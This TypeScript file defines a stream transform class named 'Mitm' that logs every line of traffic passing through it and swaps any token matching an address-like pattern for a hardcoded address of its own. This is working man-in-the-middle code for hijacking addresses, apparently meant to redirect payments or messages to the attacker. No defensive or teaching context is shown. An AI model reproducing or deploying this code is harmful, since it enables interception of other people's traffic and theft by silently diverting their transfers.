import { Transform } from 'stream';
import * as log from './logger';

const reAddr = /7[0-9a-zA-z]{25,34}(\n)?/;
const newAddr = '7YWHMfk9JZe0LM0g1ZauHuiSxhI';

export class Mitm extends Transform {
  private chunks: Buffer[] = [];

  _flush(callback: (err?: Error) => void) {
    if (this.chunks.length) {
      log.warn(
        'stream ended with data in buffer',
        Buffer.concat(this.chunks).toString()
      );
    }
    callback();
  }

  _transform(line: Buffer, _encoding: unknown, callback: () => void) {
    log.info(JSON.stringify({ line: line.toString() }));

    if (line.length < 26) {
      log.info('skipped', JSON.stringify(line.toString()));
      this.push(line);
      callback();
      return;
    }

    let replaced = false;
    const txt = line.toString();
    const words = txt.split(' ');

    for (let i = 0; i < words.length; i += 1) {
      if (words[i].length > 25 && words[i].length < 37) {
        words[i] = words[i].replace(reAddr, `${newAddr}$1`);
        replaced = true;
      }
    }

    if (replaced) {
      log.info(
        'replaced',
        JSON.stringify(line.toString()),
        JSON.stringify(words.join(' '))
      );
      this.push(Buffer.from(words.join(' ')));
    } else {
      log.info('not replaced', JSON.stringify(line.toString()));
      this.push(line);
    }

    callback();
  }
}
